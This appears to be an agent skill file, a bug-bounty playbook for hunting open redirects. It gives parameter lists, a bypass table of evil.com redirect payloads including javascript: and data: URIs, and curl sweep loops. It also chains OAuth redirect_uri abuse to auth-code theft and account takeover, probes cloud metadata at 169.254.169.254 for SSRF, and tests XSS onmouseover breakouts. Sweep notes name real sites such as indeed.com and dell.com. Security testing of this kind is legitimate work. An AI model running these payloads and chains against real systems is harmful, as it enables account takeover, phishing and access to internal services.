---
name: hunt-open-redirect
description: Hunt Open Redirect — all types including low-impact, chained to OAuth token theft → ATO, phishing chains. URL parameter manipulation, JavaScript redirect, meta refresh, header injection. Use when hunting redirect bugs or building ATO chains.
---
---

# HUNT-OPEN-REDIRECT — Open Redirect

## Crown Jewel Targets

Open redirect alone is Low. Chained to OAuth = Critical (ATO).

**Highest-value chains:**
- **Open redirect → OAuth auth code theft** — redirect_uri contains open redirect on trusted domain → auth code sent to attacker → ATO
- **Open redirect → phishing** — users trust the URL because it starts with target.com
- **Open redirect → SSRF escalation** — if redirect followed server-side → SSRF
- **Open redirect → session fixation** — force user to login endpoint with pre-set session

---

## Attack Surface Signals

```
?redirect=
?next=
?url=
?return=
?returnTo=
?continue=
?dest=
?destination=
?go=
?forward=
?location=
?target=
?redir=
?redirect_uri=
?callback=
?checkout_url=
?success_url=
?cancel_url=
/logout?returnTo=
/login?next=
/sso?callback=
```

---

## Bypass Table

| Technique | Payload |
|-----------|---------|
| Basic | `https://evil.com` |
| Protocol relative | `//evil.com` |
| Backslash bypass | `/\\evil.com` |
| At-sign confusion | `https://target.com@evil.com` |
| Double slash | `//evil.com/%2F..` |
| URL encoding | `%2Fevil.com` |
| Null byte | `evil.com%00target.com` |
| Whitespace | `evil.com%09` or `%20` |
| JavaScript URI | `javascript:window.location='https://evil.com'` |
| Data URI | `data:text/html,<script>window.location='https://evil.com'</script>` |
| Subdomain | `https://target.com.evil.com` |
| Fragment | `https://evil.com#.target.com` |

---

## Step-by-Step Hunting Methodology

### Phase 1 — Discover Redirect Parameters
```bash
# Extract all redirect candidates from crawl
cat recon/$TARGET/urls.txt | gf redirect > recon/$TARGET/redirect-candidates.txt
wc -l recon/$TARGET/redirect-candidates.txt

# Less common param names
grep -E "(\?|&)(return|next|dest|go|forward|location|to|jump|target|out|link|logout)" \
  recon/$TARGET/urls.txt >> recon/$TARGET/redirect-candidates.txt
```

### Phase 2 — Basic Test
```bash
COLLAB="https://evil.com"
cat recon/$TARGET/redirect-candidates.txt | qsreplace "$COLLAB" | while read url; do
  LOC=$(curl -s -I --max-redirs 0 "$url" | grep -i "^location:")
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-redirs 0 "$url")
  [ -n "$LOC" ] && echo "$STATUS | $LOC | $url"
done
```

### Phase 3 — Bypass Techniques
```bash
BASE_URL="https://$TARGET/redirect?url="
PAYLOADS=(
  "https://evil.com"
  "//evil.com"
  "/\\evil.com"
  "https://$TARGET@evil.com"
  "https://evil.com%23.$TARGET"
  "https://evil.com%09"
)
for P in "${PAYLOADS[@]}"; do
  LOC=$(curl -s -I --max-redirs 0 "${BASE_URL}${P}" | grep -i "^location:")
  echo "$P → $LOC"
done
```

### Phase 4 — OAuth Chain Test
```bash
# If target has OAuth, check if redirect_uri accepts open redirect
grep -i "oauth\|authorize\|redirect_uri" recon/$TARGET/urls.txt | head -20

# Construct OAuth URL with open redirect as redirect_uri
# Normal: redirect_uri=https://target.com/callback
# Attack: redirect_uri=https://target.com/redirect?url=https://evil.com
OAUTH_URL="https://$TARGET/oauth/authorize"
curl -sv "$OAUTH_URL?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com" 2>&1 | grep -i "location:"
```

### Phase 5 — Server-Side Redirect (SSRF escalation)
```bash
# If the app fetches the redirect target server-side (302 fetch follow)
curl -s "https://$TARGET/proxy?url=https://evil.com/redirect-to-169.254.169.254/latest/meta-data/"

# Or: if app makes HTTP request to the redirect destination
curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
  -H "Cookie: $SESSION"
```

---

## Automation
```bash
# openredirex
pip3 install openredirex
openredirex -l recon/$TARGET/redirect-candidates.txt -p evil.com

# nuclei
nuclei -u https://$TARGET -t redirect/ -severity medium,high

# gf + qsreplace
cat recon/$TARGET/urls.txt | gf redirect | qsreplace "https://evil.com" | \
  xargs -I{} curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" --max-redirs 0 {}
```

---

## Chain Table

| Open redirect finding | Chain to | Impact |
|----------------------|----------|--------|
| Any open redirect | OAuth redirect_uri bypass | Auth code theft → ATO |
| Any open redirect | Phishing URL with target domain | Social engineering |
| Server-side redirect | SSRF via followed redirect | Internal service access |
| Logout redirect | Session fixation | Force login with known session |

---

## FOLLOW THE CHAIN, AND TEST THE REAL PATH WITH THE REAL PARAMETER NAME

Two ways to get this class wrong, both seen in the same round:

  1. A SUBSTRING TEST ON THE LOCATION HEADER. `Location: /login?next=https://attacker` contains the attacker URL as a PARAMETER VALUE, and the Location's own host is still yours. Parse the Location with urlsplit and compare its NETLOC against the request host. A relative Location is same-host by definition.
  2. TESTING THE ROOT INSTEAD OF THE REAL PATH. A login host does not redirect at the root - it serves a login page that REFLECTS `?next=` into its own form. Sweeping `/?next=<attacker>` from the root finds nothing; the real surface is `/Account/Login?ReturnUrl=`.

So the method that works:
  - use the path AND the parameter name the application's own URLs use (the recon corpus records them),
  - follow the chain for up to 4 hops, recording each hop's status and destination host,
  - test 8 encodings of the attacker URL, because a validation check is usually applied to the DECODED value while the redirect uses a different decoding: plain, url-encoded, double-encoded, slash-encoded, protocol-relative, backslash, scheme-only, no-scheme,
  - the verdict is decided by ONE thing: does any hop's destination HOST end with the attacker domain.

A chain that ends at YOUR OWN host is not an open redirect, however many times the attacker string appears in the query. A chain that passes through your own IdP (`/dci/fp/oidc/authorize` -> `/di/idp/dwa/authorize`) and then stops is an SSO flow, not a redirect.

## A REFLECTION IN AN ATTRIBUTE IS NOT AN XSS - COUNT THE DECODES

When the value lands in `value="..."` or `action="..."`, the question is how many times the server URL-decodes it before writing the HTML. Read the BYTES around the marker, not a compound search string:

    the <input value="...">  ->  MARK%22%20onmouseover%3D%22alert%281%29
    the <form action="...">  ->  MARK%22+onmouseover%3d%22alert(1)

The form's action went through ONE MORE decode. That is the shape that turns an encoded value back into a breakout - the second decode happens AFTER the encoder ran and BEFORE the HTML is written.

So test the DECODE LADDER: send the payload encoded 0, 1, 2 and 3 times, and count the decodings the server performs. If more encoding produces MORE encoding in the response, there is no second decode and there is no breakout. If one level of encoding yields a RAW `<` or `>` inside the attribute value, that is the breakout.

Then the honest test is a PARSED element census, not a substring count: an HTMLParser that counts the tags and collects their attributes, compared against the baseline. A stray quote inside an attribute is not an element. `img_delta == 0` and `script_delta == 0` on every payload is the result that closes the class.

And the browser confirms it: load the payload, count `document.images`, count the `on*` attributes, and compare against the baseline. If the counts do not grow, the reflection is inert whatever the string looks like.

## Validation

✅ Location header in response points to evil.com (your controlled domain)
✅ Browser follows redirect to attacker-controlled page

**Severity:**
- Redirect alone: Low (most programs)
- Chains to OAuth code theft → ATO: High/Critical
- Chains to phishing with brand name: Low-Medium
- Server-side → SSRF: High

## COMPARE THE PAYLOAD TO THE DESTINATION'S AUTHORITY, NOT TO THE REQUEST HOST

A redirect sweep that asks "is the Location's host different from the host I requested?"
produces false positives on every application that does SSO. The case that broke it:

```
GET https://compliance.indeed.com/?next=<canary>
  -> Location: https://secure.indeed.com/account/login?hl=en_US
               &continue=https%3A%2F%2F<canary>%2F
```

The destination netloc is `secure.indeed.com`; the payload sits URL-encoded inside the
`continue` **query parameter**. `secure.indeed.com` differs from `compliance.indeed.com`,
so a normal same-provider login hop was scored as an off-host open redirect. On a
109-pair sweep that was the only "hit", and it was wrong.

The right question is **did the payload become the destination's AUTHORITY?** So:

1. Parse the `Location` with `urlsplit` and take the netloc **host**
   (`netloc.split('@')[-1].split(':')[0]`).
2. Require the payload's host to appear in that host — **after URL-decoding the
   Location**, since a filter may encode it.
3. A payload present only in the path or query keeps the browser on-origin and must NOT
   count.
4. An off-host destination that is **not** your payload must NOT count either (that is
   the app's own hardcoded SSO neighbour).

Guard the classifier with a **self-test that runs before the sweep** and refuses to run
on regression, including the SSO-hop case above plus the not-our-payload case. That is
what makes the fix stay fixed.

### The control tells you whether your test reached anything

Read the control first, and if the control FAILS, do not report the negative as
validation. On the authorize endpoints swept above, `redirect_uri` set to the
**registered** value returned 400/403 — the probe never reached a point where the server
evaluated the parameter, so the harness proved nothing. The honest wording for that is
**"no evidence of acceptance", not "proven to validate"**: a negative result under a
broken control carries no affirmative weight. Only the one endpoint whose control
answered `302` to its registered host (`id.indeed.tech` -> `link.indeed.tech`) supports a
real conclusion, and it rejected all six payload shapes with 400.

### The SSO-neighbour destinations to classify separately

These read like off-host redirects and are not:

```
fcs.dell.com ?redirect               -> https://www.dell.com               (hardcoded)
www.support.dell.com ?redirect       -> https://www.dell.com/support       (hardcoded)
device.manage.dell.com ?redirect_uri -> www.dell.com/di/v3/fp/oidc/authorize?...
compliance.indeed.com ?next          -> secure.indeed.com/account/login?continue=...
link.indeed.tech ?url                -> id.indeed.tech/oauth2/<id>/v1/authorize
learn.digicert.com ?returnurl        -> digicert.okta.com/.../sso/saml?SAMLRequest=...
```

Each is either a same-provider authentication hop or a hardcoded value. When the
destination contains an `authorize` / `oauth2` / `sso` path, you have not found an open
redirect — you have found the **OIDC client that will hand you a `client_id` and its
registered `redirect_uri`**, which is where the next (and higher-value) test belongs.
